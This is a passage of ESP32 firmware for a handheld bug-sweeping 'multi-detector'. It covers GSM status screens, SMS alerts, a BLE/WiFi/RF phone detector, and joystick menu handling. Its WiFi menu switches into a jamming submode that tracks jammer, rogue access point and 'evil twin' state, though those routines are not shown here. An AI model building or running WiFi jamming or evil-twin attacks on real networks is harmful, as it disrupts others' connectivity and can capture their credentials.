    imei = "";
    while (gsm.available()) { char c = gsm.read(); if (c >= '0' && c <= '9') imei += c; }
    imeiFetched = true;
  }
  display.clearDisplay();
  display.setTextSize(1); display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0); display.print(">> NETWORK INFO");
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);
  display.setCursor(0, 14); display.print("Operator:"); display.setCursor(52, 14);
  if (gsmOperator.length() > 0) { String op = gsmOperator; if (op.length() > 12) op = op.substring(0, 11) + "."; display.print(op); } else { display.print("---"); }
  display.setCursor(0, 24); display.print("Registration:"); display.setCursor(70, 24); display.print(gsmRegistered ? "HOME" : "NONE");
  display.setCursor(0, 34); display.print("Mode: 4G LTE");
  display.setCursor(0, 44); display.print("IMEI:"); display.setCursor(28, 44);
  if (imei.length() > 0) { if (imei.length() > 12) display.print(imei.substring(0, 12)); else display.print(imei); } else { display.print("Fetching..."); }
  display.display();
}

void runGsmSimStatus() {
  updateGsmStatus();
  static String iccid = "";
  if (!iccidFetched) {
    gsm.println("AT+CCID"); delay(600);
    iccid = "";
    while (gsm.available()) { char c = gsm.read(); if (c >= '0' && c <= '9') iccid += c; }
    gsm.println("AT+CIMI"); delay(500); while (gsm.available()) gsm.read();
    iccidFetched = true;
  }
  display.clearDisplay();
  display.setTextSize(1); display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0); display.print(">> SIM STATUS");
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);
  display.drawRect(100, 13, 18, 14, SH110X_WHITE);
  display.drawRect(103, 11, 12, 3, SH110X_WHITE);
  display.fillRect(106, 18, 6, 4, SH110X_WHITE);
  display.setCursor(0, 14); display.print("SIM:"); display.setCursor(28, 14);
  if (gsmSimStatus == "READY") display.print("ACTIVE");
  else if (gsmSimStatus == "PIN LOCKED") display.print("PIN LOCKED");
  else if (gsmSimStatus == "NO SIM") display.print("NO SIM");
  else display.print("CHECK SIM");
  display.setCursor(0, 24); display.print("ICCID:"); display.setCursor(28, 24);
  if (iccid.length() > 0) { if (iccid.length() > 14) display.print(iccid.substring(0, 13) + "."); else display.print(iccid); } else { display.print("---"); }
  display.setCursor(0, 34); display.print("Registered:"); display.setCursor(70, 34); display.print(gsmRegistered ? "YES" : "NO");
  display.setCursor(0, 44); display.print("Module: A7670C");
  display.display();
}

void runGsmMode() {
  switch (currentGsmSubMode) {
    case GSM_MAIN_MENU:  runGsmMainMenu();  break;
    case GSM_SEND_SMS:   runGsmSendSms();   break;
    case GSM_SIGNAL:     runGsmSignal();    break;
    case GSM_NETWORK:    runGsmNetwork();   break;
    case GSM_SIM_STATUS: runGsmSimStatus(); break;
  }
}

void resetWiFiToScanMode() {
  esp_wifi_set_promiscuous(false); delay(10);
  WiFi.softAPdisconnect(true); WiFi.disconnect(true); delay(50);
  WiFi.mode(WIFI_STA); delay(50);
  scanInitiated = false; wifiScanTimer = 0; digitalWrite(STATUS_LED, LOW);
  jammerInitialized = false; jamActive = false; evilTwinStarted = false;
}

void runPhoneDetect() {
  static unsigned long pdCycleStart = 0;
  static int pdBleCount = 0;
  static int pdWifiCount = 0;
  static int pdConf = 0;
  static int pdBleBest = -999;   // strongest nearby BLE RSSI
  static int pdWifiBest = -999;  // strongest nearby WiFi RSSI

  // --- Continuous RF sampling (keeps globals fresh for SMS alerts) ---
  int rawSum = 0;
  for (int i = 0; i < 10; i++) {
    rawSum += analogRead(RF_PIN);
    delayMicroseconds(200);
  }
  float rfV = (rawSum / 10.0 / ADC_MAX) * ADC_VREF;
  float rfDbm = (rfV / AD8318_SLOPE) + AD8318_INTERCEPT;
  float spike = 0;

  // Self-calibrate RF baseline if RF Scanner mode was never opened.
  // Takes ~1 second (50 samples) on first entry, then measurement runs live.
  static long pdCalSum = 0;
  static int pdCalCount = 0;
  if (!rfCalibrated) {
    pdCalSum += (long)(rfDbm * 100);
    pdCalCount++;
    if (pdCalCount >= 50) {
      rfBaseline = (pdCalSum / 50.0) / 100.0;
      rfCalibrated = true;
      pdCalCount = 50;
      Serial.print("PD RF calibrated. Baseline: ");
      Serial.print(rfBaseline, 1);
      Serial.println(" dBm");
    }
  } else {
    float dev = rfDbm - rfBaseline;
    if (dev < PD_RF_SPIKE_DB) {
      rfBaseline = (RF_BASELINE_ALPHA * rfBaseline) + ((1.0 - RF_BASELINE_ALPHA) * rfDbm);
    }
    spike = rfDbm - rfBaseline;
    rfSpikeDb = spike;
    rfValue = constrain((int)((spike / 25.0) * 100.0), 0, 100);
  }

  // --- 8-second cycle: 0-4s BLE scan  /  4-8s WiFi scan ---
  if (millis() - pdCycleStart > 8000) pdCycleStart = millis();
  unsigned long phase = millis() - pdCycleStart;
  bool inBlePhase = (phase < 4000);

  if (inBlePhase) {
    if (!pdBleActive) {
      pBLEScan->clearResults();
      pBLEScan->start(2, false);
      pdBleActive = true;
    }
    if (phase > 3500 && pdBleActive) {
      pBLEScan->stop();
      BLEScanResults* res = pBLEScan->getResults();
      pdBleCount = 0;
      pdBleBest = -999;
      if (res) {
        for (int i = 0; i < res->getCount(); i++) {
          int rssi = res->getDevice(i).getRSSI();
          if (rssi > PD_BLE_CLOSE_RSSI) {   // only VERY close devices count
            pdBleCount++;
            if (rssi > pdBleBest) pdBleBest = rssi;
          }
        }
      }
      pBLEScan->clearResults();
      pdBleActive = false;
    }
  } else {
    if (!pdWifiActive && WiFi.scanComplete() != -1) {
      WiFi.scanNetworks(true);
      pdWifiActive = true;
    }
    if (phase > 7500 && pdWifiActive && WiFi.scanComplete() >= 0) {
      int n = WiFi.scanComplete();
      pdWifiCount = 0;
      pdWifiBest = -999;
      for (int i = 0; i < n; i++) {
        int rssi = WiFi.RSSI(i);
        if (rssi > PD_WIFI_CLOSE_RSSI) {    // only VERY close APs count
          pdWifiCount++;
          if (rssi > pdWifiBest) pdWifiBest = rssi;
        }
      }
      WiFi.scanDelete();
      pdWifiActive = false;
    }
  }

  // --- Confidence algorithm (close-range only) ---
  pdConf = 0;
  if (pdBleCount > 0)  pdConf += min(pdBleCount * 30, 45);  // up to 45%
  if (pdWifiCount > 0) pdConf += min(pdWifiCount * 25, 35); // up to 35%
  if (spike > PD_RF_SPIKE_DB) pdConf += 20;                 // strong RF burst only (+20)
  pdConf = constrain(pdConf, 0, 100);

  // --- Distance estimate from the strongest close signal ---
  // BLE: RSSI = -59 at 1m, path loss exponent 2
  // WiFi: RSSI = -45 at 1m, path loss exponent 3
  float estDist = -1.0;
  if (pdBleBest > -999)  estDist = pow(10.0, (-59.0 - (float)pdBleBest) / 20.0);
  if (pdWifiBest > -999) {
    float dW = pow(10.0, (-45.0 - (float)pdWifiBest) / 30.0);
    if (estDist < 0.0 || dW < estDist) estDist = dW;
  }
  if (estDist > 9.9) estDist = 9.9;

  // --- Alert output: SILENT unless a phone is confirmed ---
  bool detected = (pdConf >= PD_DETECT_CONF);
  if (detected) {
    // Beep rate tied to confidence: closer = faster beeping
    int beepInterval = map(pdConf, PD_DETECT_CONF, 100, 450, 80);
    static unsigned long lastBeep = 0;
    if (millis() - lastBeep > (unsigned long)beepInterval) {
      digitalWrite(BUZZER_PIN, HIGH); delay(40); digitalWrite(BUZZER_PIN, LOW);
      lastBeep = millis();
    }
    digitalWrite(STATUS_LED, (millis() / 150) % 2);
    digitalWrite(VIBRATION_PIN, (millis() / 250) % 2);

    static unsigned long lastPdSms = 0;
    if (millis() - lastPdSms > SMS_COOLDOWN) {
      lastPdSms = millis();
      sendAlertSMS("PHONE DETECTED! Conf:" + String(pdConf) + "% BLE:" + String(pdBleCount) +
                   " WiFi:" + String(pdWifiCount) + " RF:" + String((int)spike) + "dB");
    }
  } else {
    // completely silent
    digitalWrite(STATUS_LED, LOW);
    digitalWrite(VIBRATION_PIN, LOW);
    digitalWrite(BUZZER_PIN, LOW);
  }

  // --- OLED Display ---
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0);
  display.print("PHONE DETECTOR");
  display.setCursor(100, 0);
  display.print(inBlePhase ? "BT" : "WF");
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);

  if (detected) {
    display.setTextSize(2);
    display.setCursor(8, 13);
    display.print("PHONE!");
    display.setTextSize(1);
    display.setCursor(0, 33);
    display.print("MATCH:"); display.print(pdConf); display.print("%");
    if (estDist >= 0.0) {
      display.setCursor(72, 33);
      display.print("~"); display.print(estDist, 1); display.print("m");
    }
    display.setCursor(0, 44);
    display.print("BLE:"); display.print(pdBleCount);
    display.setCursor(64, 44);
    display.print("WiFi:"); display.print(pdWifiCount);
    display.setCursor(0, 55);
    if (!rfCalibrated) {
      display.print("RF: CALIBRATING");
    } else {
      display.print("RF:"); display.print((int)spike); display.print("dB");
    }
    if ((millis() / 300) % 2) {
      display.setCursor(90, 55); display.print("<<<");
    }
  } else {
    display.setCursor(0, 13); display.print("Scanning close range");
    display.setCursor(0, 25);
    display.print("BLE:"); display.print(pdBleCount);
    display.setCursor(64, 25);
    display.print("WiFi:"); display.print(pdWifiCount);
    display.setCursor(0, 37);
    if (!rfCalibrated) {
      display.print("RF CAL: "); display.print(pdCalCount * 2); display.print("%");
    } else {
      display.print("RF delta:"); display.print((int)spike); display.print("dB");
    }
    display.drawLine(0, 47, 128, 47, SH110X_WHITE);
    display.setCursor(0, 53);
    display.print("Silent - no phone");
    display.setCursor(0, 63);
    if ((millis() / 800) % 2) display.print(".");
  }
  display.display();
}

void setup() {
  Serial.begin(115200); delay(500);
  Serial.println("\n=== MULTI-DETECTOR V3.0 BOOT ===");

  pinMode(BUZZER_PIN, OUTPUT); pinMode(VIBRATION_PIN, OUTPUT); pinMode(STATUS_LED, OUTPUT);
  pinMode(CAMERA_SENSOR_PIN, INPUT); pinMode(MIC_PIN, INPUT); pinMode(RF_PIN, INPUT);
  pinMode(BATTERY_PIN, INPUT); pinMode(HALL_PIN, INPUT_PULLUP);
  pinMode(JOY_SW_PIN, INPUT_PULLUP); pinMode(JOY_X_PIN, INPUT); pinMode(JOY_Y_PIN, INPUT);

  pinMode(GSM_PEN_PIN, OUTPUT);
  pinMode(GSM_PWK_PIN, OUTPUT);
  digitalWrite(GSM_PEN_PIN, HIGH);
  delay(300);
  digitalWrite(GSM_PWK_PIN, HIGH);
  delay(100);
  digitalWrite(GSM_PWK_PIN, LOW);
  delay(1500);
  digitalWrite(GSM_PWK_PIN, HIGH);
  delay(3000);

  analogReadResolution(12); analogSetAttenuation(ADC_11db);

  Wire.begin(SDA_PIN, SCL_PIN);
  if (!display.begin(0x3C, true)) { Serial.println("SH1106 Allocation Failed"); while (1); }
  display.setRotation(2); display.setTextWrap(false); display.setTextColor(SH110X_WHITE);

  digitalWrite(BUZZER_PIN, HIGH); digitalWrite(STATUS_LED, HIGH); delay(150);
  digitalWrite(BUZZER_PIN, LOW); digitalWrite(STATUS_LED, LOW);

  WiFi.mode(WIFI_MODE_STA); WiFi.disconnect(true); delay(50);

  BLEDevice::init("S3-DETECTOR"); pBLEScan = BLEDevice::getScan();
  if (pBLEScan != nullptr) { pBLEScan->setActiveScan(true); pBLEScan->setInterval(40); pBLEScan->setWindow(30); }

  Serial.println("Checking LoRa SX1278...");
  loraModuleFound = initLoRa();
  if (loraModuleFound) Serial.println("LoRa SX1278 READY");
  else Serial.println("LoRa SX1278 NOT DETECTED");

  Serial.println("Starting GSM A7670C...");
  gsm.begin(115200, SERIAL_8N1, GSM_RX_PIN, GSM_TX_PIN);
  delay(2000);
  gsm.println("AT"); delay(1000);
  String atResp = "";
  while (gsm.available()) atResp += (char)gsm.read();
  gsmModuleFound = (atResp.indexOf("OK") != -1);
  Serial.println("GSM AT test: " + String(gsmModuleFound ? "OK" : "NO RESPONSE"));

  if (gsmModuleFound) {
    gsm.println("AT+CMGF=1"); delay(500); while (gsm.available()) gsm.read();
    gsmInitTime = millis();
    gsm.println("AT+CGPS=0"); delay(200);
    gsm.println("AT+CGPS=1"); delay(300); while (gsm.available()) gsm.read();
  }

  gsmMenuAnimatedBox = 14 * 100;
  gsmMenuTargetBox = 14 * 100;
}

void loop() {
  if (millis() - batteryTimer > 1000) { updateBattery(); batteryTimer = millis(); }

  static unsigned long lastGsmUpdate = 0;
  if (gsmModuleFound && millis() - lastGsmUpdate > 30000) {
    updateGsmStatus();
    lastGsmUpdate = millis();
  }

  int xVal = analogRead(JOY_X_PIN);
  int yVal = analogRead(JOY_Y_PIN);
  bool swPressed = (digitalRead(JOY_SW_PIN) == LOW);
  bool isStickInCenter = (xVal > JOY_LOW_ZONE && xVal < JOY_HIGH_ZONE && yVal > JOY_LOW_ZONE && yVal < JOY_HIGH_ZONE);

  if (isStickInCenter && !swPressed) readyForInput = true;

  if (readyForInput) {
    if (currentMode == START_SCREEN) {
      // Auto-advance
    }
    else if (currentMode == MENU_SCREEN) {
      if (yVal < JOY_LOW_ZONE) { selectedMenuItem--; if (selectedMenuItem < 0) selectedMenuItem = totalMenuItems - 1; readyForInput = false; }
      else if (yVal > JOY_HIGH_ZONE) { selectedMenuItem++; if (selectedMenuItem >= totalMenuItems) selectedMenuItem = 0; readyForInput = false; }
      else if (swPressed) {
        readyForInput = false; scanInitiated = false;
        switch (selectedMenuItem) {
          case 0: renderPremiumSplash(icon_sweep, "TUNING RF FIELD"); currentMode = MODE_RF; break;
          case 1:
            wifiCount = 0; scanSelectedIndex = 0; scrollOffset = 0; currentWifiSubMode = WIFI_SCAN;
            jamActive = false; jamPacketCount = 0; jamErrorCount = 0; jammerInitialized = false; evilTwinStarted = false;
            WiFi.mode(WIFI_STA); WiFi.disconnect(true); delay(50); scanInitiated = false;
            renderPremiumSplash(icon_wifi, "MESHING CORES"); currentMode = MODE_WIFI; break;
          case 2: bleCount = 0; scanSelectedIndex = 0; scrollOffset = 0; renderPremiumSplash(icon_bluetooth, "BINDING SNIFFER"); currentMode = MODE_BLE; break;
          case 3:
            renderPremiumSplash(logo_crosshair, "PHONE HUNTER");
            currentMode = MODE_PHONE_DETECT;
            break;
          case 4: renderPremiumSplash(logo_crosshair, "CALIBRATING GAUSS"); currentMode = MODE_MAGNETIC; break;
          case 5: renderPremiumSplash(icon_sweep, "BALANCING AUDIO"); currentMode = MODE_AUDIO; break;
          case 6: renderPremiumSplash(icon_camera, "IGNITING MATRIX"); currentMode = MODE_CAMERA; break;
          case 7: renderPremiumSplash(icon_antenna, "LINKING SX1278"); currentMode = MODE_LORA; terminalPage = 0; controlMode = false; modeSelectorActive = false; loraInfoPage = 0; break;
          case 8: renderPremiumSplash(icon_gsm, "STARTING CELL"); gsmMenuSelected = 0; currentGsmSubMode = GSM_MAIN_MENU; currentMode = MODE_GSM; break;
          case 9: renderPremiumSplash(logo_crosshair, "FETCHING CONFIG"); scanSelectedIndex = 0; currentMode = MODE_SETTINGS; break;
        }
        delay(150);
      }
    }
    else if (currentMode == MODE_WIFI_INFO) {
      if (yVal < JOY_LOW_ZONE) { wifiInfoPage--; if (wifiInfoPage < 0) wifiInfoPage = 2; readyForInput = false; }
      else if (yVal > JOY_HIGH_ZONE) { wifiInfoPage++; if (wifiInfoPage > 2) wifiInfoPage = 0; readyForInput = false; }
      else if (swPressed || xVal > JOY_HIGH_ZONE) { currentMode = MODE_WIFI; currentWifiSubMode = WIFI_SCAN; readyForInput = false; delay(150); }
    }
    else if (currentMode == MODE_BLE_INFO) {
      if (swPressed || xVal > JOY_HIGH_ZONE) { currentMode = MODE_BLE; readyForInput = false; delay(150); }
    }
    else if (currentMode == MODE_GSM) {
      if (currentGsmSubMode == GSM_MAIN_MENU) {
        if (yVal < JOY_LOW_ZONE) { gsmMenuSelected--; if (gsmMenuSelected < 0) gsmMenuSelected = GSM_MENU_ITEMS - 1; readyForInput = false; }
        else if (yVal > JOY_HIGH_ZONE) { gsmMenuSelected++; if (gsmMenuSelected >= GSM_MENU_ITEMS) gsmMenuSelected = 0; readyForInput = false; }
        else if (swPressed) {
          readyForInput = false; scanSelectedIndex = 0;
          switch (gsmMenuSelected) {
            case 0: currentGsmSubMode = GSM_SEND_SMS; break;
            case 1: currentGsmSubMode = GSM_SIGNAL; break;
            case 2: currentGsmSubMode = GSM_NETWORK; break;
            case 3: currentGsmSubMode = GSM_SIM_STATUS; break;
          }
          delay(150);
        }
        else if (xVal > JOY_HIGH_ZONE) {
          alert(false); digitalWrite(STATUS_LED, LOW);
          currentMode = MENU_SCREEN; readyForInput = false; delay(150);
        }
      } else {
        if (xVal > JOY_HIGH_ZONE) { currentGsmSubMode = GSM_MAIN_MENU; readyForInput = false; delay(150); }
        else if (yVal < JOY_LOW_ZONE && currentGsmSubMode == GSM_SEND_SMS) { scanSelectedIndex--; if (scanSelectedIndex < 0) scanSelectedIndex = GSM_QUICK_SMS_COUNT - 1; readyForInput = false; }
        else if (yVal > JOY_HIGH_ZONE && currentGsmSubMode == GSM_SEND_SMS) { scanSelectedIndex++; if (scanSelectedIndex >= GSM_QUICK_SMS_COUNT) scanSelectedIndex = 0; readyForInput = false; }
        else if (swPressed) {
          readyForInput = false;
          switch (currentGsmSubMode) {
            case GSM_SEND_SMS: {
              int idx = scanSelectedIndex % GSM_QUICK_SMS_COUNT;
              String msg = "";

              if (idx == 0) {
                // Status: All OK — sends full system status
                msg = "Status OK. RF:" + String(rfValue) + "% WiFi:" + String(wifiCount) + 
                      " BLE:" + String(bleCount) + " Bat:" + String(batteryVoltage, 1) + 
                      "V " + String(batteryPercent) + "%";
              } 
              else if (idx == 1) {
                // Alert test signal — current all-mode readings
                msg = "TEST RF:" + String((int)rfSpikeDb) + "dB WiFi:" + String(wifiCount) + 
                      " BLE:" + String(bleCount) + " Mag:" + String((hallValue == LOW) ? "DET" : "OK") + 
                      " Aud:" + String(micValue) + " Cam:" + String(camDetectionActive ? "DET" : "NO") + 
                      " Bat:" + String(batteryPercent) + "%";
              } 
              else if (idx == 2) {
                // Battery report — exact format you wanted
                msg = "Battery " + String(batteryVoltage, 1) + "V " + String(batteryPercent) + "%";
              } 
              else if (idx == 3) {
                // Emergency Alert — checks critical conditions live
                msg = "EMERGENCY! ";
                bool critical = false;
                if (batteryPercent < 20) { msg += "Battery DOWN! "; critical = true; }
                if (rfSpikeDb > RF_SPIKE_THRESHOLD) { msg += "High RF " + String((int)rfSpikeDb) + "dB! "; critical = true; }
                if (camDetectionActive) { msg += "Hidden Cam! "; critical = true; }
                if (hallValue == LOW) { msg += "Magnetic! "; critical = true; }
                if (micValue > 1800) { msg += "Audio! "; critical = true; }
                if (!critical) msg += "All clear.";
              }

              sendAlertSMS(msg);
              delay(200);
              break;
            }
            case GSM_SIM_STATUS: { iccidFetched = false; delay(100); break; }
            default: break;
          }
          delay(150);
        }
      }
    }
    else if (currentMode == MODE_SETTINGS) {
      if (yVal < JOY_LOW_ZONE) { scanSelectedIndex--; if (scanSelectedIndex < 0) scanSelectedIndex = MAX_SETTINGS_ITEMS - 1; readyForInput = false; }
      else if (yVal > JOY_HIGH_ZONE) { scanSelectedIndex++; if (scanSelectedIndex >= MAX_SETTINGS_ITEMS) scanSelectedIndex = 0; readyForInput = false; }
      else if (xVal > JOY_HIGH_ZONE) { currentMode = MENU_SCREEN; readyForInput = false; delay(150); }
    }
    else if (currentMode == MODE_PHONE_DETECT) {
      if (xVal > JOY_HIGH_ZONE) {
        if (pdBleActive) { pBLEScan->stop(); pBLEScan->clearResults(); pdBleActive = false; }
        if (WiFi.scanComplete() == -1) { WiFi.scanDelete(); }
        alert(false); digitalWrite(STATUS_LED, LOW);
        currentMode = MENU_SCREEN; readyForInput = false; delay(150);
      }
    }
    else if (currentMode == MODE_LORA) {
      if (modeSelectorActive) {
        // Mode selector navigation
        if (yVal < JOY_LOW_ZONE) { modeSelectorIdx--; if (modeSelectorIdx < 0) modeSelectorIdx = REMOTE_MODE_COUNT - 1; readyForInput = false; }
        else if (yVal > JOY_HIGH_ZONE) { modeSelectorIdx++; if (modeSelectorIdx >= REMOTE_MODE_COUNT) modeSelectorIdx = 0; readyForInput = false; }
        else if (xVal > JOY_HIGH_ZONE) { modeSelectorActive = false; readyForInput = false; delay(150); }
        else if (swPressed) {
          sendWroomCommand(String(remoteModeCmds[modeSelectorIdx]));
          modeSelectorActive = false;
          readyForInput = false;
          delay(150);
        }
      } else {
        // SW short press = toggle CONTROL / VIEW mode
        // SW long press = open mode selector
        if (swPressed) {
          if (swPressStart == 0) swPressStart = millis();
          if (millis() - swPressStart > 800 && !swLongHandled) {
            swLongHandled = true;
            modeSelectorActive = true;
            modeSelectorIdx = 0;
            readyForInput = false;
          }
        }
        if (!swPressed) {
          if (swPressStart > 0 && !swLongHandled && millis() - swPressStart < 800) {
            controlMode = !controlMode;
            readyForInput = false;
          }
          swPressStart = 0; swLongHandled = false;
        }

        if (controlMode) {
          // CONTROL MODE: joystick sends remote commands
          if (yVal < JOY_LOW_ZONE) { sendWroomCommand("u"); readyForInput = false; }
          else if (yVal > JOY_HIGH_ZONE) { sendWroomCommand("d"); readyForInput = false; }
          else if (xVal < JOY_LOW_ZONE) { sendWroomCommand("b"); readyForInput = false; }
          else if (xVal > JOY_HIGH_ZONE) { sendWroomCommand("s"); readyForInput = false; }
        } else {
          // VIEW MODE: joystick flips pages, left goes back
          if (yVal < JOY_LOW_ZONE) { terminalPage--; if (terminalPage < 0) terminalPage = 4; readyForInput = false; }
          else if (yVal > JOY_HIGH_ZONE) { terminalPage++; if (terminalPage > 4) terminalPage = 0; readyForInput = false; }
          else if (xVal > JOY_HIGH_ZONE) { currentMode = MENU_SCREEN; readyForInput = false; delay(150); }
        }
      }
    }
    else {
      if (xVal > JOY_HIGH_ZONE) {
        alert(false); digitalWrite(STATUS_LED, LOW);
        if (currentMode == MODE_WIFI) {
          WiFi.scanDelete();
          if (currentWifiSubMode == WIFI_JAM) stopRogueAp(); else resetWiFiToScanMode();
          jammerInitialized = false; evilTwinStarted = false;
        }
        if (currentMode == MODE_BLE) pBLEScan->stop();
        if (currentMode == MODE_CAMERA) { camPeakValue = 0; camDetectionActive = false; }
        scanInitiated = false;
        currentMode = MENU_SCREEN; readyForInput = false; delay(150);
      }
      else if (currentMode == MODE_WIFI && wifiCount > 0) {
        static unsigned long swPressTime = 0;
        static bool swLongPressHandled = false;
        if (swPressed) {
          if (swPressTime == 0) swPressTime = millis();
          if (millis() - swPressTime > 800 && !swLongPressHandled) {
            swLongPressHandled = true;
            if (currentWifiSubMode == WIFI_SCAN) {
              currentWifiSubMode = WIFI_JAM; jamActive = true; jamPacketCount = 0; jamErrorCount = 0;
              jammerInitialized = false; evilTwinStarted = false; jamStartTime = millis();
              readyForInput = false; delay(150);
            }
          }
        }
        if (!swPressed) {
          if (swPressTime > 0 && !swLongPressHandled && millis() - swPressTime < 800) {
            if (currentWifiSubMode == WIFI_SCAN) { wifiInfoPage = 0; currentMode = MODE_WIFI_INFO; readyForInput = false; delay(150); }
            else if (currentWifiSubMode == WIFI_JAM) { stopRogueAp(); readyForInput = false; delay(150); }
          }
          swPressTime = 0; swLongPressHandled = false;
        }
        if (currentWifiSubMode == WIFI_SCAN) {
          if (yVal < JOY_LOW_ZONE) { scanSelectedIndex--; if (scanSelectedIndex < 0) scanSelectedIndex = wifiCount - 1; readyForInput = false; }
          else if (yVal > JOY_HIGH_ZONE) { scanSelectedIndex++; if (scanSelectedIndex >= wifiCount) scanSelectedIndex = 0; readyForInput = false; }
        }
      }
      else if (currentMode == MODE_BLE && bleCount > 0) {
        if (yVal < JOY_LOW_ZONE) { scanSelectedIndex--; if (scanSelectedIndex < 0) scanSelectedIndex = bleCount - 1; readyForInput = false; }
        else if (yVal > JOY_HIGH_ZONE) { scanSelectedIndex++; if (scanSelectedIndex >= bleCount) scanSelectedIndex = 0; readyForInput = false; }
        else if (swPressed) { currentMode = MODE_BLE_INFO; readyForInput = false; delay(150); }
      }
    }
  }

  switch (currentMode) {
    case START_SCREEN:  runStartScreen();    break;
    case MENU_SCREEN:   runMenuScreen();     break;
    case MODE_RF:       runRFScan();         break;
    case MODE_WIFI:     if (currentWifiSubMode == WIFI_JAM) runJamMode(); else runWiFiScan(); break;
    case MODE_WIFI_INFO: runWiFiInfo();      break;
    case MODE_BLE:      runBLEScan();        break;
    case MODE_BLE_INFO: runBLEInfo();        break;
    case MODE_MAGNETIC: runMagneticDetect(); break;
    case MODE_AUDIO:    runAudioDetect();    break;
    case MODE_CAMERA:   runCameraDetector(); break;
    case MODE_LORA:     runLoRaMode();       break;
    case MODE_SETTINGS: runSettingsMode();   break;
    case MODE_GSM:      runGsmMode();        break;
    case MODE_PHONE_DETECT: runPhoneDetect(); break;
  }
  delay(10);
}